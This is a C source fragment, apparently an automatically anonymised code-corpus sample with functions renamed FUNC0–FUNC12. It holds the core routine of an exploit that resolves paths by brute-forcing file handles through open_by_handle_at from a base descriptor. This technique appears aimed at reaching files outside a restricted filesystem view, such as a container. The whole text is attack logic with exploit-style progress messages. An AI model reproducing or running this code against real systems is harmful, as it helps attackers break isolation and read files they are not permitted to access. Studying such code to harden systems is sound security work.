#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int uint32_t ;
struct my_file_handle {int handle_bytes; int handle_type; int* f_handle; } ;
struct file_handle {int dummy; } ;
struct dirent {char* d_name; int d_ino; } ;
typedef  int /*<<< orphan*/  ino ;
typedef  int /*<<< orphan*/  i ;
typedef  int /*<<< orphan*/  DIR ;

/* Variables and functions */
 int /*<<< orphan*/  O_RDONLY ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (char*) ; 
 int /*<<< orphan*/  FUNC3 (struct my_file_handle*) ; 
 int /*<<< orphan*/ * FUNC4 (int) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC6 (int*,int*,int) ; 
 scalar_t__ FUNC7 (int,struct file_handle*,int /*<<< orphan*/ ) ; 
 struct dirent* FUNC8 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  stderr ; 
 char* FUNC9 (char const*,char) ; 
 int /*<<< orphan*/  FUNC10 (char*) ; 
 scalar_t__ FUNC11 (char*,char const*,int /*<<< orphan*/ ) ; 

int FUNC12(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
        .handle_bytes = 8,
        .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;

    path = FUNC9(path, '/');

    // recursion stops if path has been resolved
    if (!path) {
        FUNC6(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }
    ++path;
    FUNC5(stderr, "[*] Resolving '%s'\n", path);

    if ((fd = FUNC7(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        FUNC2("[-] open_by_handle_at");

    if ((dir = FUNC4(fd)) == NULL)
        FUNC2("[-] fdopendir");

    for (;;) {
        de = FUNC8(dir);
        if (!de)
            break;
        FUNC5(stderr, "[*] Found %s\n", de->d_name);
        if (FUNC11(de->d_name, path, FUNC10(de->d_name)) == 0) {
            FUNC5(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
            ino = de->d_ino;
            break;
        }
    }

    FUNC5(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");


    if (de) {
        for (uint32_t i = 0; i < 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            FUNC6(outh.f_handle, &ino, sizeof(ino));
            FUNC6(outh.f_handle + 4, &i, sizeof(i));

            if ((i % (1<<20)) == 0)
                FUNC5(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
            if (FUNC7(bfd, (struct file_handle *)&outh, 0) > 0) {
                FUNC1(dir);
                FUNC0(fd);
                FUNC3(&outh);
                return FUNC12(bfd, path, &outh, oh);
            }
        }
    }

    FUNC1(dir);
    FUNC0(fd);
    return 0;
}